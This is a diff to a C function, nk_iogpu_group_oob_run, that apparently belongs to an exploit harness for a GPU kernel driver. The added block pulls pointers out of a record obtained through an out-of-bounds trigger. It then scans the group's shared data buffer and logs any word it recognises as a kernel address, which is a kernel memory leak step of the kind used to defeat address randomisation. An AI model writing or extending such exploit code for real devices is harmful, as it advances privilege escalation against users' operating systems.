@@ -813,6 +813,36 @@ void nk_iogpu_group_oob_run(int trigger)
                     ol("[grp]   OUT+0x%03zx = 0x%016llx%s", o, (unsigned long long)w,
                        grp_is_kernel_va(w) ? "   <-- KERNEL ADDRESS" : "");
                 }
+                /* The record hands us two pointers into our own address
+                 * space: OUT+0x008 is the group's shared data buffer
+                 * (0x4000 bytes) and OUT+0x010 is the group slot that
+                 * advances by 0xC0 per group. The data buffer is where the
+                 * group's state lives - and the state holds kernel
+                 * pointers (the element array, the bitmap). Read it. */
+                {
+                    uint64_t dbuf = 0, slot = 0, dsz = 0;
+                    memcpy(&dbuf, out7 + 0x08, 8);
+                    memcpy(&slot, out7 + 0x10, 8);
+                    memcpy(&dsz, out7 + 0x28, 8);
+                    if (dbuf && dbuf < 0x0001000000000000ULL) {
+                        ol("[grp] shared buffer at 0x%016llx (size 0x%llx), slot 0x%016llx",
+                           (unsigned long long)dbuf, (unsigned long long)dsz,
+                           (unsigned long long)slot);
+                        size_t lim = dsz ? (size_t)dsz : 0x4000;
+                        if (lim > 0x4000) lim = 0x4000;
+                        size_t shown = 0;
+                        for (size_t o = 0; o + 8 <= lim && shown < 64; o += 8) {
+                            uint64_t w = 0;
+                            if (grp_safe_read(dbuf + o, &w, 8) != 0) break;
+                            if (!w) continue;
+                            shown++;
+                            ol("[grp]   data+0x%04zx = 0x%016llx%s", o,
+                               (unsigned long long)w,
+                               grp_is_kernel_va(w) ? "   <-- KERNEL ADDRESS" : "");
+                        }
+                        ol("[grp] shared buffer: %zu non-zero words", shown);
+                    }
+                }
             }
         }
         }
